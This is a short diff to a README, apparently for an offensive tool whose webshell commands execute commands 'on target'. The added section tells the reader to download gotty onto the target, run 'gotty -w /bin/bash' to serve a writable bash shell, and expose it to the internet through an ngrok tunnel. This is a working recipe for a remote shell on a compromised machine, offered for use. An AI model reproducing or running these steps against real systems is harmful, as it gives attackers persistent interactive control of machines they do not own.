@@ -341,6 +341,14 @@ export WSURL=[ngrok_http_endpoint]
 bang.webshell.php.dial [cmd]     #execute your command on target and retrieve stdout
 ```
 
+#### alternative with a standalone Webshell binary
+
+Download [`gotty`](https://github.com/yudai/gotty) on target, and laugh Webshell with:
+```shell
+gotty -w /bin/bash
+# Then exposing it with ngrok http 8080
+```
+
 
 
 
